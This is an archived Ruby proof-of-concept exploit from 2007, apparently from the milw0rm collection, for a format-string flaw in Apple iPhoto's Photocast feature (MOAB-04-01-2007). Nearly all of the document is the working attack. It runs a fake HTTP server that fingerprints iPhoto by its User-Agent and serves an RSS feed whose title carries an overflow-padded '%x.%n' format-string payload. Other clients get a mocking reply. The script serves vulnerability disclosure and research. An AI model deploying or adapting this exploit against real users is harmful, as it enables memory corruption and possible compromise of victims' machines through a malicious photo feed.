<html><head><title>iLife iPhoto Photocast (XML title) Remote Format String PoC</title></head><pre>#!/usr/bin/ruby
#
# (c) 2006 LMH &lt;lmh [at] info-pull.com&gt;
# bug by Kevin Finisterre &lt;kf_lists [at] digitalmunition.com&gt;
# proof of concept for MOAB-04-01-2007
# see http://projects.info-pull.com/moab/MOAB-04-01-2007.rb

require 'socket'

IPHOTO_FEED = &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;\r\n&quot; +
              &quot;&lt;rss version=\&quot;2.0\&quot; xmlns:aw=\&quot;http://www.apple.com/ilife/wallpapers\&quot;&gt;\r\n&quot; +
              &quot;&lt;channel&gt;\r\n&quot; +
              &quot;&lt;title&gt;&quot; + (&quot;A&quot; * 256) + &quot;%x.%n.%n.%n.%n.%n&lt;/title&gt;\r\n&quot; +
              &quot;&lt;item&gt;\r\n&quot; +
              &quot;&lt;title&gt;In Gruber We Trust&lt;/title&gt;\r\n&quot; +
              &quot;&lt;aw:image&gt;http://www.digitalmunition.com/digital_munitions_detonator.jpg\r\n&quot; +
              &quot;&lt;/aw:image&gt;\r\n&quot; +
              &quot;&lt;/item&gt;\r\n&quot; +
              &quot;&lt;/channel&gt;\r\n&quot; +
              &quot;&lt;/rss&gt;\r\n&quot;

web_port    = (ARGV[0] || 80).to_i

puts &quot;++ Starting fake HTTP server at port #{web_port}.&quot;
web_server  = TCPServer.new(nil, web_port)
while (session = web_server.accept)
  user_agent = session.recvfrom(2000)[0].scan(/User-Agent: (.*)/).flatten[0]
  session.print &quot;HTTP/1.1 200/OK\r\nServer: Unabomber/1.0\r\n&quot;
  
  # Check if remote user-agent is iPhoto.
  if user_agent.scan(/iPhoto/).size &lt; 1
    puts &quot;-- User connected (#{session.peeraddr[3]}) but not running iPhoto, sending bullshit.&quot;
    session.print &quot;Content-type: text/plain\r\n\r\n&quot;
    session.print &quot;All your Aunt Sophia are belong to us.&quot;
  else
    puts &quot;++ iPhoto #{user_agent.scan(/iPhoto\/(.+?) /)[0]} user connected (#{session.peeraddr[3]}), &quot; +
         &quot;sending payload (#{IPHOTO_FEED.size} bytes).&quot;
    session.print &quot;Content-type: text/xml\r\n\r\n&quot;
    session.print IPHOTO_FEED
  end

  session.close
end

# milw0rm.com [2007-01-04]</pre></html>